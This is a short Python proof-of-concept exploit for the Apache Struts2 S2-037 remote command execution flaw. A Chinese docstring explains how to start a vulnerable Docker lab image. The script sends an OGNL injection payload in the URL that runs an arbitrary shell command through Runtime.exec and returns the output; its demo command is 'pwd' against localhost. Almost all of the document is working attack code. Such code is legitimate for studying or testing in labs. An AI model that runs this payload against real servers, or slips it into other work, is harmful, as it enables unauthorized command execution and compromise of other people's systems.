"""
struts2漏洞，可以远程执行命令
S2-037
可以直接用docker模拟环境
1、拉取镜像到本地
docker pull medicean/vulapps:s_struts2_s2-037
2、启动环境
docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-037
create by swm
2018/06/19
"""

import requests


class S2:
    def __init__(self, commond):
        self.url = 'http://127.0.0.1:8080/orders/4/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command={}'
        self.completeurl = self.url.format(commond)

    def execute(self):
        try:
            res = requests.get(self.completeurl)
            if res.status_code == 200:
                response = res.text
                return response
            else:
                info = 'something wrong:{}'.format(res.status_code)
                return info
        except Exception as err:
            print(err)


if __name__ == '__main__':
    command = 'pwd'
    s = S2(command)
    res = s.execute()
    print(res)
